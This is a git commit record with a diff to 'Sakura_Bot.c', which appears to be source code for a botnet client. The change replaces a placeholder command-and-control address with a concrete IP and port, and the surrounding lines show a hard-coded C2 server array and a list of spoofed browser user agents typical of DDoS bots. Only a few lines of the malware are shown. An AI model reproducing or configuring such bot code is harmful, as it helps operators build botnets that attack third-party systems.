dbfd39c39888f0d14ed79f5862e9bb740c34c0ff
anaslmzbeb <rayanjames853@gmail.com>
2025-04-30 03:36:32 +0100

    Update Sakura_Bot.c

--- Sakura_Bot.c
+++ Sakura_Bot.c
@@ -25,7 +25,7 @@
 #define PRINT_BUF_LEN 12
 #define std_packet 1460
 //Made By Zinqo.
-unsigned char *commServer[] = {"SERVERIP:12345"};
+unsigned char *commServer[] = {"172.17.0.16:6666"};
 
 const char *useragents[] = {
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
